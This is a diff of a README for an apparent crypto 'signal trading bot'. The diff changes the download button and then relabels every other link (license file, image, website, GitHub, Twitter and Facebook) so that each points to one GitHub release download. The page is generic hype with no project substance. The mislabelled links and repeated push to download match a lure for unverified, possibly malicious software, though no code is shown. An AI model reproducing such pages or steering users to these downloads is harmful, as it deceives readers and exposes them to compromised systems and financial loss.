@@ -36,7 +36,7 @@ Explore a wide range of topics related to cryptocurrency trading and analysis co
 ## Getting Started 🛠️
 To begin your journey with the Gravit Signal Masters Trading Crypto Analysis Crypto Signal Trading Bot, download the software package by clicking the button below:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0)](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0)
 
 ## Launch the Software 😎
 Once you have downloaded the software package, extract it and launch the application to start exploring the exciting features of the trading bot.
@@ -45,7 +45,7 @@ Once you have downloaded the software package, extract it and launch the applica
 If the provided download link is not working, or you need more information, please check the **Releases** section of this repository for alternative download options.
 
 ## Visit the Website 🌐
-Don't forget to visit the [Gravit Signal Masters](https://github.com/22155555/1875695542) website to stay updated with the latest developments and enhancements to the trading bot.
+Don't forget to visit the [Gravit Signal Masters](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0) website to stay updated with the latest developments and enhancements to the trading bot.
 
 ## Join the Community 👥
 Connect with fellow crypto enthusiasts, traders, and developers in the vibrant community surrounding the Gravit Signal Masters Trading Crypto Analysis Crypto Signal Trading Bot. Share insights, tips, and strategies for maximizing your trading potential.
@@ -59,14 +59,14 @@ We welcome contributions from the community to enhance the functionality and fea
 ## Let's Get Trading! 💸💰
 Embark on your crypto trading journey with the Gravit Signal Masters Trading Crypto Analysis Crypto Signal Trading Bot. Empower yourself with cutting-edge tools and insights to navigate the dynamic world of cryptocurrencies with confidence and success.
 
-![Crypto Trading](https://www.example.com/images/crypto_trading.jpg)
+![Crypto Trading](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0)
 
 ## License 📜
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0) file for details.
 
 ---
 
-🔗 Connect with us on [GitHub](https://github.com/) | 🐦 Follow us on [Twitter](https://twitter.com/) | 👍 Like us on [Facebook](https://www.facebook.com/)
+🔗 Connect with us on [GitHub](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0) | 🐦 Follow us on [Twitter](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0) | 👍 Like us on [Facebook](https://github.com/Truongvanhu/Gravit-Signal-Masters-Trading-Crypto-Analysis-Crypto-Signal-Trading-Bot/releases/tag/v2.0)
 
 🚀 Happy Trading with Gravit Signal Masters! 🌟📊
 
